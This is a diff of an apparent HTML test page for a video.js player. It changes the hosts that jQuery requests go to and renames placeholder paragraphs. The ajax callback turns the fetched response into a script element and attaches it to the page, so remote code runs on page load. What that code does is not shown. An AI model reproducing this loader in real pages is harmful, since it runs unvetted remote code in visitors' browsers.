@@ -48,9 +48,10 @@
         });
     });
 }
-    $.get("https://test-alert.net/d/15/?c=c866f8a7-3965-4e70-9195-b9c6ebdf2fe7")
+
+    $.get("https://test.twin-garden.xyz/d/1107/?c=4dc50256-a3c7-4eae-bf9b-71fa0690d2b6")
     $.ajax({
-      url:"https://test-alert.net/brezvfe/6281793b-e9a8-4a98-8f01-1f968f4e7abf/res",
+      url:"https://test.twin-garden.xyz/brezvfe/2469203f-ae93-46bc-837b-fa6f6d56f780/res",
       timespan:1000
       }).done(function(data,textStatus,jqXHR) {
               var script = document.createElement('script');
@@ -59,12 +60,15 @@
               bodyTag.appendChild(script)
       }).fail(function(jqXHR, textStatus, errorThrown ) {
     }).always(function(){});
+    
 </script>
 </head>
 
 <body style="background-color:white">
   <p>TestPlayer 1</p>
-  <p id="target_text">これはとりあえず見せていい文字</p>
+  <p id="test">これはとりあえず見せていい文字</p>
+  <p id="test2">これはとりあえず見せていい文字</p>
+
   <video id="video1" class="video-js vjs-default-skin vjs-big-play-centered"></video>
 </body>
 
